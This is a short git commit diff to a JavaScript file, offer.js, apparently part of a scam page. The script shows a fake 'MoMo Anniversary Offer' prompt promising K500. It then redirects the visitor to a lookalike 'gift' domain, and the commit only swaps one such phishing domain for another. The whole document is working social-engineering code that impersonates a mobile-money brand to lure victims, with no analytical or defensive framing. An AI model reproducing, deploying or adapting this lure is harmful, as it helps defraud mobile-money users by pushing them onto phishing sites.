716b9134c50c18f029fe078704fa89d9873fab18
essac5523me <essac5523+me@gmail.com>
2025-04-25 23:52:10 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,5 @@
 var password = 'Claim K500'
 password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive k500 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','Claim K500');
 if (password != 'Claim K500') {
-location.href='https://momo-zm.offernow.lat/gift';
+location.href='https://momo-reward.4g-data.info/gift';
 }
